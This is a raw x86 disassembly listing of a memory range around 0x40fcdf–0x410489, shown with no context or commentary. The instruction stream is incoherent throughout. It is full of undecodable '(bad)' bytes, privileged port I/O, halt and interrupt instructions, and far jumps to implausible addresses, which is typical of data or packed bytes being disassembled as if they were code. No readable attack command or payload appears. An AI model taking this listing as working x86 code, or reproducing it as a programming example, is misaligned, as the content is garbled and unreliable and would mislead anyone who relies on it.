  40fcdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fce0:	ja     0x40fd1d
  40fce2:	dec    edi
  40fce3:	outs   dx,BYTE PTR ds:[esi]
  40fce4:	sbb    esi,DWORD PTR [ebx]
  40fce6:	imul   esi,DWORD PTR [edi+0x114dedad],0xffffff8c
  40fced:	mov    WORD PTR [edx+0x794b4a03],gs
  40fcf3:	adc    DWORD PTR [edx],esi
  40fcf5:	shl    BYTE PTR [esi-0x7f],cl
  40fcf8:	dec    DWORD PTR gs:[esi+0x359e8d3c]
  40fcff:	push   ss
  40fd00:	fwait
  40fd01:	in     eax,dx
  40fd02:	push   esi
  40fd03:	stos   DWORD PTR es:[edi],eax
  40fd04:	mov    dh,0x11
  40fd06:	mov    eax,0xc131dc37
  40fd0b:	pop    ecx
  40fd0c:	mov    ah,0xb4
  40fd0e:	mov    ch,0x4b
  40fd10:	mov    edi,0x56fbe2a7
  40fd15:	js     0x40fca6
  40fd17:	push   0xb0bb42c6
  40fd1c:	push   esi
  40fd1d:	sub    edi,ebx
  40fd1f:	mov    edx,0xe8889289
  40fd24:	pop    edx
  40fd25:	popa   
  40fd26:	stos   DWORD PTR es:[edi],eax
  40fd27:	rol    ch,1
  40fd29:	sbb    BYTE PTR [edi+0x4f],ch
  40fd2c:	jbe    0x40fd7d
  40fd2e:	or     eax,0xa0940207
  40fd33:	je     0x40fcda
  40fd35:	sub    eax,0xb131aa8f
  40fd3a:	ror    DWORD PTR [edx-0xf65b83e],1
  40fd40:	pop    ebp
  40fd41:	imul   BYTE PTR [esi+0xcb6c2e0]
  40fd47:	loopne 0x40fcff
  40fd49:	in     al,dx
  40fd4a:	mov    eax,0x6fe4106
  40fd4f:	push   ss
  40fd50:	mov    dh,0x85
  40fd52:	add    eax,0x76ec7ee8
  40fd57:	cmp    eax,0x435a99c1
  40fd5c:	fld    TBYTE PTR [esi+0x5f]
  40fd5f:	push   ebp
  40fd60:	int3   
  40fd61:	sbb    eax,0x743afbad
  40fd66:	dec    edx
  40fd67:	add    dl,0xad
  40fd6a:	add    eax,0xc852660c
  40fd6f:	jb     0x40fdcf
  40fd71:	ins    DWORD PTR es:[edi],dx
  40fd72:	dec    ebx
  40fd73:	test   DWORD PTR ds:0x951f6d15,ecx
  40fd79:	ins    DWORD PTR es:[edi],dx
  40fd7a:	xor    bl,BYTE PTR [ebx+0x2c0be58d]
  40fd80:	in     al,dx
  40fd81:	dec    eax
  40fd82:	sbb    BYTE PTR [esi],dl
  40fd84:	add    BYTE PTR ds:[edi],ah
  40fd87:	cmp    cl,ah
  40fd89:	mov    dh,0x36
  40fd8b:	mov    dh,0xc6
  40fd8d:	mov    ds:0xae774b0f,eax
  40fd92:	push   esp
  40fd93:	mov    al,ds:0x2a5ddf22
  40fd98:	dec    ebx
  40fd99:	aaa    
  40fd9a:	xchg   DWORD PTR [ebp+0x2c07ce47],esi
  40fda0:	popa   
  40fda1:	xchg   ebp,eax
  40fda2:	test   eax,0xa12db6a9
  40fda7:	imul   ecx,esi,0x15
  40fdaa:	mov    ecx,0x1432f930
  40fdaf:	mov    dh,0xb6
  40fdb1:	pop    ebx
  40fdb2:	dec    edx
  40fdb3:	pop    es
  40fdb4:	ins    BYTE PTR es:[edi],dx
  40fdb5:	cmp    esi,DWORD PTR [esi]
  40fdb7:	pop    ebx
  40fdb8:	aas    
  40fdb9:	dec    edi
  40fdba:	es mov edx,0x8b3d2ed0
  40fdc0:	jmp    0x158f71a2
  40fdc5:	(bad)  
  40fdc6:	sbb    eax,DWORD PTR [ebp+0x7db1c50d]
  40fdcc:	daa    
  40fdcd:	(bad)  
  40fdce:	mov    ah,0x9d
  40fdd0:	repz mov edi,0x6db6c2db
  40fdd6:	push   cs
  40fdd7:	call   0x523a:0x865f1ab3
  40fdde:	dec    ebp
  40fddf:	and    BYTE PTR [esi],al
  40fde1:	mov    al,BYTE PTR [ebp+0x6114811b]
  40fde7:	popf   
  40fde8:	and    eax,0x175535ca
  40fded:	(bad)  
  40fdef:	mov    BYTE PTR [esi+0x28],ch
  40fdf2:	adc    eax,eax
  40fdf4:	push   ecx
  40fdf5:	push   es
  40fdf6:	mov    dh,0xb1
  40fdf8:	shl    BYTE PTR [esi+0x1a2f02fb],0xd5
  40fdff:	lods   al,BYTE PTR ds:[esi]
  40fe00:	(bad)  
  40fe01:	jge    0x40fe62
  40fe03:	lods   eax,DWORD PTR ds:[esi]
  40fe04:	fstp   QWORD PTR [edx-0x40]
  40fe07:	and    ebx,DWORD PTR [edi-0x5ea5622f]
  40fe0d:	bound  ecx,QWORD PTR [ebx+0x1d]
  40fe10:	add    al,0xdb
  40fe12:	pop    ebp
  40fe13:	gs out dx,eax
  40fe15:	std    
  40fe16:	adc    BYTE PTR [ebx],cl
  40fe18:	push   eax
  40fe19:	fadd   QWORD PTR [ebp-0x45]
  40fe1c:	mov    ebp,0x176549a0
  40fe21:	inc    ebx
  40fe22:	xlat   BYTE PTR ds:[ebx]
  40fe23:	inc    ecx
  40fe24:	sbb    ebp,DWORD PTR ds:0xb9464ada
  40fe2a:	repnz or al,dh
  40fe2d:	xchg   ecx,eax
  40fe2e:	outs   dx,BYTE PTR ds:[esi]
  40fe2f:	sub    al,0x6c
  40fe31:	or     ecx,DWORD PTR ds:0xd6308942
  40fe37:	or     bl,bl
  40fe39:	shl    ch,1
  40fe3b:	mov    ebx,0x44db5b6d
  40fe40:	sbb    esp,DWORD PTR [edx-0x53]
  40fe43:	pop    edx
  40fe44:	jmp    0x69ae310b
  40fe49:	and    edx,eax
  40fe4b:	inc    DWORD PTR cs:[esi-0x79]
  40fe4f:	and    ch,BYTE PTR [eax+eax*1]
  40fe52:	out    dx,eax
  40fe53:	fld    QWORD PTR [eax]
  40fe55:	mov    esp,0x7a800a83
  40fe5a:	bound  ebx,QWORD PTR [ebx-0x46]
  40fe5d:	hlt    
  40fe5e:	rcl    DWORD PTR [ebx],0xbc
  40fe61:	enter  0x5cce,0x7f
  40fe65:	ret    0x6d85
  40fe68:	fcmovnu st,st(0)
  40fe6a:	call   0x1a99ca94
  40fe6f:	(bad)  
  40fe70:	jno    0x40fdfe
  40fe72:	mov    ds:0xda05da16,eax
  40fe77:	ja     0x40fdfb
  40fe79:	mov    edi,0x11bc9663
  40fe7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe7f:	jmp    0x37ac7511
  40fe84:	cmp    DWORD PTR [edx],ebp
  40fe86:	in     al,0x9e
  40fe88:	sub    al,0x7b
  40fe8a:	mov    cl,0x17
  40fe8c:	inc    cx
  40fe8e:	mov    ebx,0x96b4a8b5
  40fe93:	mov    al,0x28
  40fe95:	ret    0xd89
  40fe98:	je     0x40fe75
  40fe9a:	or     bh,BYTE PTR [ecx-0x5488b350]
  40fea0:	and    ebx,edx
  40fea2:	jecxz  0x40feb4
  40fea4:	ins    BYTE PTR es:[edi],dx
  40fea5:	sub    al,0x6d
  40fea7:	fwait
  40fea8:	(bad)  
  40fea9:	or     BYTE PTR [ecx-0x22],dl
  40feac:	cs add eax,0xa06dadb7
  40feb2:	inc    edx
  40feb3:	mov    esi,?
  40feb5:	jbe    0x40ff25
  40feb7:	test   eax,0xb85b6169
  40febc:	jne    0x40feed
  40febe:	imul   edx,DWORD PTR [edx+ebx*4],0xffffff97
  40fec2:	lods   al,BYTE PTR ds:[esi]
  40fec3:	or     DWORD PTR ds:0x829b8bae,ebx
  40fec9:	in     eax,dx
  40feca:	inc    esi
  40fecb:	shl    BYTE PTR [edi+0x488c65a8],cl
  40fed1:	call   0x9245:0x476afd4e
  40fed8:	sub    eax,DWORD PTR [ebx+0x3b]
  40fedb:	fldenv [eax*4+0xbb68586]
  40fee2:	cmp    bh,ch
  40fee4:	sbb    edx,edi
  40fee6:	loop   0x40fe85
  40fee8:	ins    DWORD PTR es:[edi],dx
  40fee9:	push   ss
  40feea:	mov    edx,0xdb3a0ba2
  40feef:	mov    DWORD PTR [ebx-0x7e],ebx
  40fef2:	jg     0x40ff49
  40fef4:	ins    BYTE PTR es:[edi],dx
  40fef5:	add    eax,0x668836da
  40fefa:	cmp    eax,DWORD PTR [edx+0x60f50bb6]
  40ff00:	mov    ebx,0x62756d2d
  40ff05:	(bad)  
  40ff06:	mov    ebx,0x83f87574
  40ff0b:	sbb    cl,BYTE PTR [ebx+0x74]
  40ff0e:	add    BYTE PTR [ebx-0x4c118e4],bh
  40ff14:	push   es
  40ff15:	addr16 sbb al,0xdb
  40ff18:	add    BYTE PTR ds:0x3886d051,ch
  40ff1e:	or     BYTE PTR es:[edx+0x42ff95b0],ch
  40ff25:	shl    BYTE PTR [ecx+ecx*2+0x0],1
  40ff29:	ds push ebx
  40ff2b:	add    BYTE PTR [esi+esi*4],dl
  40ff2e:	pop    esp
  40ff2f:	(bad)  
  40ff31:	inc    esp
  40ff32:	jecxz  0x40feea
  40ff34:	fs cdq 
  40ff36:	adc    al,0x3b
  40ff38:	aaa    
  40ff39:	mov    cl,0x46
  40ff3b:	ins    DWORD PTR es:[edi],dx
  40ff3c:	push   esi
  40ff3d:	xor    dl,0x6f
  40ff40:	data16 cmp al,0x0
  40ff43:	sbb    eax,edi
  40ff45:	add    BYTE PTR [esp+ebx*4+0x73],bh
  40ff49:	add    eax,0x12
  40ff4c:	fcmovnb st,st(2)
  40ff4e:	test   eax,0x98b0e631
  40ff53:	icebp  
  40ff54:	or     BYTE PTR [edx-0x5f],dl
  40ff57:	push   0x6d
  40ff59:	sub    dh,BYTE PTR [edi+0x5bec808b]
  40ff5f:	jmp    0x40ff37
  40ff61:	(bad)  
  40ff62:	pop    ds
  40ff63:	xchg   esp,eax
  40ff64:	or     ch,BYTE PTR ss:[ebp-0x7ad9f2b4]
  40ff6b:	lods   eax,DWORD PTR ds:[esi]
  40ff6c:	sub    eax,0xdddeb410
  40ff71:	inc    edi
  40ff72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff73:	in     al,dx
  40ff74:	or     esi,DWORD PTR [esi+0x40]
  40ff77:	(bad)  
  40ff79:	mov    WORD PTR [ecx-0x7e58bbaa],?
  40ff7f:	push   cs
  40ff80:	rcl    DWORD PTR [esi+0xb],0x5b
  40ff84:	mov    ebx,0xbc80a315
  40ff89:	mov    eax,edx
  40ff8b:	push   cs
  40ff8c:	icebp  
  40ff8d:	jns    0x40ff5c
  40ff8f:	mov    eax,ds:0xd0b6d6e
  40ff94:	fsubr  QWORD PTR [ecx]
  40ff96:	mov    dh,0x37
  40ff98:	xchg   BYTE PTR [edx],ch
  40ff9a:	adc    BYTE PTR [edx-0x25],dl
  40ff9d:	ficom  DWORD PTR [ebp+ebp*8+0x16042ff1]
  40ffa4:	and    BYTE PTR [esi-0x66],ch
  40ffa7:	sub    BYTE PTR [esi-0x25],0x5f
  40ffab:	mov    edi,0x3b38ad8f
  40ffb0:	dec    ebx
  40ffb1:	jae    0x410021
  40ffb3:	fcmovnbe st,st(6)
  40ffb5:	add    BYTE PTR [edx+0x5871412f],dl
  40ffbb:	pop    ss
  40ffbc:	sbb    DWORD PTR ds:0x83a970b0,0xffffff9a
  40ffc3:	ins    BYTE PTR es:[edi],dx
  40ffc4:	dec    ebp
  40ffc5:	retf   
  40ffc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffc7:	sbb    DWORD PTR [edx-0x4a],ebx
  40ffca:	test   DWORD PTR [ebp-0x4d46624e],eax
  40ffd0:	sbb    DWORD PTR [ebx-0x24c29142],edi
  40ffd6:	ins    DWORD PTR es:[edi],dx
  40ffd7:	sub    ebx,esp
  40ffd9:	and    edx,DWORD PTR [ebx-0x6a]
  40ffdc:	rcr    ch,1
  40ffde:	aaa    
  40ffdf:	dec    ebp
  40ffe0:	fcomp  DWORD PTR [edi]
  40ffe2:	ds adc al,0xc6
  40ffe5:	mov    dh,0xb0
  40ffe7:	ins    DWORD PTR es:[edi],dx
  40ffe8:	(bad)  
  40ffe9:	push   edi
  40ffea:	inc    edi
  40ffeb:	xor    eax,0x54a1bfca
  40fff0:	inc    edx
  40fff1:	add    ebp,DWORD PTR [edx-0x49]
  40fff4:	lea    ebp,[ecx-0x1]
  40fff7:	add    dl,BYTE PTR [ebx+ebp*4+0x20]
  40fffb:	mov    ecx,DWORD PTR [ebx]
  40fffd:	in     eax,dx
  40fffe:	inc    edx
  40ffff:	imul   eax,DWORD PTR [edx],0x93ea733e
  410005:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410006:	mov    ds:0x2c4174c4,eax
  41000b:	adc    eax,0x775d2a2e
  410010:	add    ebp,DWORD PTR [eax-0x57]
  410013:	adc    eax,0xa6f59e53
  410018:	mov    ebx,0xe8603915
  41001d:	cmp    al,0x73
  41001f:	xchg   ebx,eax
  410020:	inc    eax
  410021:	jecxz  0x410097
  410023:	ret    
  410024:	rol    BYTE PTR [esi-0x7f],1
  410027:	mov    ch,BYTE PTR [esi-0x49]
  41002a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41002b:	or     ch,BYTE PTR [ebp+ebp*8-0x2a]
  41002f:	add    BYTE PTR [ecx-0x4b],dh
  410032:	sbb    eax,0x77e96189
  410037:	or     eax,DWORD PTR [ebp+0x21b6d56]
  41003d:	xchg   esp,eax
  41003e:	enter  0x13e3,0x10
  410042:	shl    BYTE PTR [ebp+edx*1+0x14f6348a],1
  410049:	push   ecx
  41004a:	mov    eax,ds:0xd1b6ed18
  41004f:	push   ecx
  410050:	rcr    BYTE PTR [esp+edx*2+0x7c0e5f30],0xf2
  410058:	mov    dh,0x85
  41005a:	sbb    al,BYTE PTR [eax+0x5f98ae2c]
  410060:	std    
  410061:	and    esp,DWORD PTR [eax*4-0x56e897db]
  410068:	pop    esi
  410069:	mov    bh,0xdd
  41006b:	fcmove st,st(2)
  41006d:	jae    0x410075
  41006f:	call   0x424f6e2a
  410074:	cwde   
  410075:	std    
  410076:	xlat   BYTE PTR ds:[ebx]
  410077:	mov    edx,0x2edaa43b
  41007c:	sub    eax,0x20fdcb45
  410081:	add    al,0xc9
  410083:	out    0xc2,al
  410085:	test   DWORD PTR [ebp-0x5f],ebp
  410088:	sub    ebp,DWORD PTR [esi]
  41008a:	push   ds
  41008b:	jbe    0x4100e7
  41008d:	inc    esp
  41008e:	fidiv  WORD PTR [eax+ebx*8]
  410091:	fcomp  st(0)
  410093:	mov    dh,0x10
  410095:	pop    esp
  410096:	sub    ecx,DWORD PTR [eax]
  410098:	mov    esp,0x3a4b9e27
  41009d:	fild   DWORD PTR ds:0x56615b74
  4100a3:	outs   dx,BYTE PTR ds:[esi]
  4100a4:	ss add dh,ch
  4100a7:	and    al,0x71
  4100a9:	xchg   BYTE PTR [ecx+0x55b6c2d],dh
  4100af:	push   eax
  4100b0:	pop    esp
  4100b1:	daa    
  4100b2:	jo     0x410126
  4100b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4100b5:	(bad)  
  4100b6:	rcl    dh,cl
  4100b8:	mov    dh,0xb4
  4100ba:	jb     0x41011f
  4100bc:	or     BYTE PTR [ecx],dl
  4100be:	jge    0x4100a9
  4100c0:	dec    esp
  4100c1:	adc    eax,0xd2db0598
  4100c6:	(bad)  
  4100c7:	iret   
  4100c8:	jo     0x4100be
  4100ca:	cmp    edx,DWORD PTR [ebp+0x65]
  4100cd:	(bad)
  4100d0:	mov    bh,0x4a
  4100d2:	jge    0x410056
  4100d4:	(bad)  
  4100d5:	ss push esi
  4100d7:	xchg   esi,eax
  4100d8:	sub    al,0x68
  4100da:	adc    DWORD PTR [ebp+0xaa63fda],ebp
  4100e0:	mov    ebx,0x2250b1ba
  4100e5:	xchg   esi,eax
  4100e6:	xchg   DWORD PTR [bp+si+0x31d8],esp
  4100eb:	mov    edx,ebx
  4100ed:	mov    eax,0x52ec2bd4
  4100f2:	test   DWORD PTR [edx-0x4f],eax
  4100f5:	xor    DWORD PTR [ebp-0x69],ebp
  4100f8:	mov    dh,0xad
  4100fa:	inc    esi
  4100fb:	or     DWORD PTR [eax-0x59],0xfffffff9
  4100ff:	push   ebx
  410100:	add    ch,ch
  410102:	jp     0x41014b
  410104:	ret    0x8d85
  410107:	lods   eax,DWORD PTR ds:[esi]
  410108:	mov    WORD PTR [edx],?
  41010a:	mov    ebp,0xa00dceb4
  41010f:	lock sub eax,DWORD PTR [eax+0x1b]
  410113:	xchg   edi,eax
  410114:	(bad)  
  410116:	jge    0x4100b6
  410118:	xchg   BYTE PTR [edi+0x2d],ch
  41011b:	hlt    
  41011c:	ins    DWORD PTR es:[edi],dx
  41011d:	sbb    esi,DWORD PTR [ebp+ebx*1+0x5386dcf7]
  410124:	and    edx,ebp
  410126:	sbb    dl,0x8a
  410129:	ins    DWORD PTR es:[edi],dx
  41012a:	fld    TBYTE PTR [esi+0x67]
  41012d:	pop    ecx
  41012e:	push   eax
  41012f:	push   ebx
  410130:	push   ebx
  410131:	jecxz  0x4100c0
  410133:	xchg   BYTE PTR [esi+0x3b6b6169],dh
  410139:	sub    al,0x2a
  41013b:	int    0xe
  41013d:	jp     0x410162
  41013f:	shr    BYTE PTR [edx+0x23],1
  410142:	arpl   WORD PTR [ebx-0x100f9f24],bp
  410148:	fld    QWORD PTR [edi-0x29b48a54]
  41014e:	xchg   esi,eax
  41014f:	pop    edi
  410150:	push   0xffffffd7
  410152:	fdivr  DWORD PTR [edi-0x3143ff2a]
  410158:	and    al,0x5c
  41015a:	inc    esp
  41015b:	sbb    ebp,DWORD PTR [esi*4+0xb7cabed]
  410162:	push   0xffffffdd
  410164:	fwait
  410165:	icebp  
  410166:	sbb    eax,0x2c2e96eb
  41016b:	ins    DWORD PTR es:[edi],dx
  41016c:	add    dl,dh
  41016e:	mov    esp,0x99131061
  410173:	mov    edi,0xb6e9e383
  410178:	xor    eax,0x9272ada8
  41017d:	fsubrp st(1),st
  41017f:	xlat   BYTE PTR ds:[ebx]
  410180:	sbb    al,0xe7
  410182:	pop    ss
  410183:	add    BYTE PTR [esp+esi*2],cl
  410186:	jbe    0x410137
  410188:	mov    eax,ds:0x36693fee
  41018d:	mov    eax,0xd2af1035
  410192:	xchg   edx,eax
  410193:	pop    DWORD PTR [ebp+edx*4+0x19]
  410197:	test   eax,0xd055b6fc
  41019c:	pop    eax
  41019d:	inc    ecx
  41019e:	dec    ebx
  41019f:	scas   eax,DWORD PTR es:[edi]
  4101a0:	add    BYTE PTR [esi+0x1134a76f],dh
  4101a6:	(bad)  [ebp-0xb]
  4101a9:	mov    dl,0xee
  4101ab:	jecxz  0x410184
  4101ad:	mov    eax,ds:0xb1b00c69
  4101b2:	inc    eax
  4101b3:	jae    0x41015b
  4101b5:	js     0x4101a2
  4101b7:	or     dl,BYTE PTR [esi+0x560ea585]
  4101bd:	or     BYTE PTR ds:0x36605bee,dh
  4101c3:	mov    ch,0x2
  4101c5:	ss mov dh,0xb8
  4101c8:	(bad)  
  4101c9:	aas    
  4101ca:	data16 fcmovnu st,st(2)
  4101cd:	adc    dl,al
  4101cf:	mov    dh,0xbf
  4101d1:	ds loopne 0x410166
  4101d4:	or     ebx,edx
  4101d6:	out    0xd6,al
  4101d8:	lds    edx,FWORD PTR [esi-0x7e]
  4101db:	xor    ecx,eax
  4101dd:	clc    
  4101de:	jmp    0xb6aa:0x50b68070
  4101e5:	mov    dh,0x62
  4101e7:	leave  
  4101e8:	or     eax,0x4be54746
  4101ed:	fcmovnb st,st(2)
  4101ef:	mov    ds:0x2cc281f1,al
  4101f4:	ficom  DWORD PTR [ecx-0x4ff4ff32]
  4101fa:	sub    eax,0x871aa8b4
  4101ff:	sbb    esp,edi
  410201:	adc    DWORD PTR [edi+edx*4+0x10bb5bb7],edi
  410208:	inc    edi
  410209:	fild   WORD PTR [ebx+0x17ac6f32]
  41020f:	xchg   ebx,eax
  410210:	add    cl,cl
  410212:	pop    ebx
  410213:	mov    bl,0xb6
  410215:	ins    DWORD PTR es:[edi],dx
  410216:	sbb    eax,0x418fd101
  41021b:	in     al,dx
  41021c:	sti    
  41021d:	es ja  0x410246
  410220:	sub    ch,0xc2
  410223:	mov    esp,0xf892bdbb
  410228:	stos   DWORD PTR es:[edi],eax
  410229:	jecxz  0x410257
  41022b:	xor    eax,0x4756746e
  410230:	push   esp
  410231:	sbb    ebx,0xffffff8d
  410234:	sahf   
  410235:	or     al,0x68
  410237:	push   0x54
  410239:	ins    BYTE PTR es:[edi],dx
  41023a:	sub    eax,0x7b095c3
  41023f:	cmp    ch,al
  410241:	rcl    dh,cl
  410243:	cmp    al,0x5c
  410245:	mov    ebp,0xca269ba7
  41024a:	cdq    
  41024b:	sbb    eax,DWORD PTR [eax]
  41024d:	paddusb mm4,QWORD PTR [edi+0x597b9b66]
  410254:	mov    ah,0xd1
  410256:	mov    cl,0xb4
  410258:	rcl    BYTE PTR [ecx],1
  41025a:	ror    esi,1
  41025c:	xchg   edi,eax
  41025d:	ins    BYTE PTR es:[edi],dx
  41025e:	mov    dh,0xae
  410260:	inc    edx
  410261:	ins    DWORD PTR es:[edi],dx
  410262:	pop    ebx
  410263:	mov    ebx,0xfb518878
  410268:	or     edx,DWORD PTR [edx]
  41026a:	pop    ss
  41026b:	and    DWORD PTR [esi-0x4968fa2c],0xffffffd7
  410272:	xchg   BYTE PTR [edi],dl
  410274:	aam    0xde
  410276:	push   ss
  410277:	dec    edx
  410278:	add    ebx,DWORD PTR [ebp+0x30]
  41027b:	mov    cl,0x50
  41027d:	rcl    al,cl
  41027f:	fldenv [esi-0x2a44e557]
  410285:	mov    dh,0x6d
  410287:	lea    ecx,[esi+0x4b2c105f]
  41028d:	fnsave [ebp+0x58201cf7]
  410293:	fcomp  DWORD PTR [edx-0x7a5845a0]
  410299:	mov    ecx,0x2573dda
  41029e:	ins    DWORD PTR es:[edi],dx
  41029f:	mov    ds:0x5f5f1edb,eax
  4102a4:	pop    ebp
  4102a5:	and    WORD PTR ds:0x8daaec51,ax
  4102ac:	fistp  DWORD PTR [ebp-0x62]
  4102af:	lds    edi,FWORD PTR [eax+0x685e1d00]
  4102b5:	outs   dx,BYTE PTR ds:[esi]
  4102b6:	test   eax,0x7f2b76a5
  4102bb:	xlat   BYTE PTR ds:[ebx]
  4102bc:	xchg   DWORD PTR [ecx-0x12740d98],esp
  4102c2:	ret    0xd6d2
  4102c5:	jbe    0x410307
  4102c7:	cmp    al,0x35
  4102c9:	lds    ebx,FWORD PTR [edi*1-0x49d19a92]
  4102d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102d1:	test   DWORD PTR [ebp-0x197de2f3],ebp
  4102d7:	pop    ss
  4102d8:	cmp    edx,DWORD PTR [ebp+0x6b6dc479]
  4102de:	aaa    
  4102df:	lahf   
  4102e0:	mov    ch,0xe3
  4102e2:	pop    edi
  4102e3:	ret    0x1a44
  4102e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4102e7:	rol    dl,cl
  4102e9:	push   ss
  4102ea:	ins    DWORD PTR es:[edi],dx
  4102eb:	dec    ebp
  4102ec:	inc    edi
  4102ed:	jns    0x410281
  4102ef:	inc    esi
  4102f0:	outs   dx,BYTE PTR ds:[esi]
  4102f1:	or     esi,DWORD PTR [edi]
  4102f3:	ret    0xdd45
  4102f6:	mov    dh,0x9e
  4102f8:	addr16 (bad) 
  4102fa:	fst    DWORD PTR [ebx]
  4102fc:	and    al,0x81
  4102fe:	ret    0xa36d
  410301:	pop    edi
  410302:	xchg   edx,eax
  410303:	pop    edi
  410304:	fdivr  DWORD PTR [edx]
  410306:	inc    eax
  410307:	test   BYTE PTR [ebp-0x1b969e8a],ch
  41030d:	je     0x4102be
  41030f:	pop    ds
  410310:	mov    dh,0x1e
  410312:	xor    BYTE PTR [eax*1+0x3fb6d85d],0xa7
  41031a:	jae    0x410305
  41031c:	or     al,0x73
  41031e:	and    bh,BYTE PTR [ebx+0x35b6c2d6]
  410324:	sub    al,0xde
  410326:	es adc al,0x47
  410329:	dec    esi
  41032a:	sbb    al,0xef
  41032c:	inc    eax
  41032d:	mov    bh,0x6
  41032f:	sbb    bl,0x9a
  410332:	shr    DWORD PTR [eax],1
  410334:	and    cl,BYTE PTR [esi-0x43e16447]
  41033a:	(bad)  
  41033b:	mov    es,WORD PTR [eax+0x43b5211f]
  410341:	sbb    bl,BYTE PTR [edx-0x25c94b70]
  410347:	lea    ebp,[ebp-0x7b6f1709]
  41034d:	push   ss
  41034e:	mov    WORD PTR [ecx],fs
  410350:	dec    eax
  410351:	fcomp  st(0)
  410353:	mov    dh,0xd
  410355:	(bad)  
  410357:	and    BYTE PTR [edx-0x64e117cb],0xa1
  41035e:	je     0x41033b
  410360:	fdivr  DWORD PTR [ebx+0x32]
  410363:	cmp    al,0x7d
  410365:	das    
  410366:	inc    edx
  410367:	out    dx,eax
  410368:	or     ebx,esp
  41036a:	ins    DWORD PTR es:[edi],dx
  41036b:	add    eax,ebp
  41036d:	ins    DWORD PTR es:[edi],dx
  41036e:	mov    bl,0x7d
  410370:	icebp  
  410371:	ins    BYTE PTR es:[edi],dx
  410372:	popf   
  410373:	sti    
  410374:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410375:	into   
  410376:	mov    ch,BYTE PTR [esi-0x4c]
  410379:	outs   dx,BYTE PTR ds:[esi]
  41037a:	push   ebx
  41037b:	(bad)  
  41037c:	fstp   st(1)
  41037e:	ins    BYTE PTR es:[edi],dx
  41037f:	xor    BYTE PTR [eax-0x12fe3d6a],bl
  410385:	mov    edi,DWORD PTR [edx]
  410387:	push   ss
  410388:	jl     0x41039a
  41038a:	out    0x80,eax
  41038c:	scas   al,BYTE PTR es:[edi]
  41038d:	bound  eax,QWORD PTR [ecx]
  41038f:	cli    
  410390:	jecxz  0x4103b9
  410392:	pop    ds
  410393:	push   es
  410394:	mov    dh,BYTE PTR [esi+0x59c352a5]
  41039a:	adc    DWORD PTR [ebx],esi
  41039c:	or     ebx,ebx
  41039e:	adc    esi,DWORD PTR [edi+0x3e4c35db]
  4103a4:	or     ah,BYTE PTR [ebp-0x32f5be83]
  4103aa:	mov    dh,0xb0
  4103ac:	sub    eax,0x8f2fe6d
  4103b1:	mov    ah,0x77
  4103b3:	(bad)  
  4103b4:	dec    esp
  4103b5:	or     BYTE PTR [ecx],ch
  4103b7:	pop    ebx
  4103b8:	sbb    ebx,DWORD PTR [ebx]
  4103ba:	in     eax,dx
  4103bb:	std    
  4103bc:	pop    ss
  4103bd:	or     BYTE PTR [esi],bl
  4103bf:	mov    al,ds:0xf8588bcc
  4103c4:	add    DWORD PTR [esi-0x2c],0xbafce66e
  4103cb:	add    bh,BYTE PTR [eax+0x1b]
  4103ce:	push   ss
  4103cf:	push   ss
  4103d0:	mov    dh,0x76
  4103d2:	xchg   ebp,eax
  4103d3:	xchg   DWORD PTR [edx+0x33eeaee0],ebp
  4103d9:	sub    ebp,DWORD PTR [ebx+0x0]
  4103dc:	sbb    ebx,DWORD PTR [ebx]
  4103de:	pop    ss
  4103df:	repz sub DWORD PTR [bx+si],eax
  4103e3:	xor    edx,DWORD PTR [edi+0x6c]
  4103e6:	ficom  DWORD PTR [esi-0x46]
  4103e9:	rcl    DWORD PTR [esp+ebp*1-0x10186216],1
  4103f0:	cmp    BYTE PTR [ecx-0x68],ch
  4103f3:	ins    DWORD PTR es:[edi],dx
  4103f4:	pop    ss
  4103f5:	mov    cl,0xd4
  4103f7:	in     eax,0x98
  4103f9:	xchg   edi,eax
  4103fa:	fs out dx,eax
  4103fc:	pusha  
  4103fd:	mov    eax,ds:0x856c6ed4
  410402:	mov    ebp,0x6fd7d48e
  410407:	out    dx,al
  410408:	popf   
  410409:	pop    ecx
  41040a:	(bad)  
  41040b:	mov    dh,0xb5
  41040d:	mov    al,0x7a
  41040f:	je     0x4103b4
  410411:	mov    ebp,0xedc52246
  410416:	xor    BYTE PTR [eax-0x69],al
  410419:	or     bl,BYTE PTR [ebx+0x58]
  41041c:	(bad)  
  41041e:	sbb    al,0xce
  410420:	cmp    edi,DWORD PTR [ebx+0xd6c6dbe]
  410426:	mov    WORD PTR [eax+edi*1],?
  410429:	mov    al,0xcf
  41042b:	jbe    0x41047d
  41042d:	dec    ebp
  41042e:	out    0x0,al
  410430:	push   ecx
  410431:	aaa    
  410432:	ficom  DWORD PTR [edx+0x65]
  410435:	sar    BYTE PTR [ecx-0x3e],0x42
  410439:	sbb    dl,BYTE PTR es:[edx+0x17]
  41043d:	jo     0x4104aa
  41043f:	push   cs
  410440:	clc    
  410441:	adc    ecx,DWORD PTR [edx-0x46]
  410444:	push   esi
  410445:	sahf   
  410446:	rol    dl,cl
  410448:	rcl    dh,cl
  41044a:	mov    edi,0x5d75abe
  41044f:	add    DWORD PTR [ebp+0x4d],esi
  410452:	lods   eax,DWORD PTR ds:[esi]
  410453:	xor    eax,0xdddedb0b
  410458:	aam    0xb5
  41045a:	out    dx,al
  41045b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41045c:	add    ch,BYTE PTR [ebp-0x2495a7e9]
  410462:	inc    edx
  410463:	popa   
  410464:	dec    edx
  410465:	and    al,0x6e
  410467:	xor    eax,0x8e0a1bff
  41046c:	fsubr  DWORD PTR [eax-0x24]
  41046f:	push   0x2d44664a
  410474:	and    ecx,ecx
  410476:	ins    DWORD PTR es:[edi],dx
  410477:	pop    ebx
  410478:	bound  esp,QWORD PTR [ebx+0x5b]
  41047b:	push   0xffffffa1
  41047d:	add    eax,0xca2a21a4
  410482:	and    DWORD PTR [eax+0x46],edx
  410485:	pop    ss
  410486:	jne    0x4104eb
  410488:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410489:	sbb    eax,DWORD PTR [ebx-0x3f]
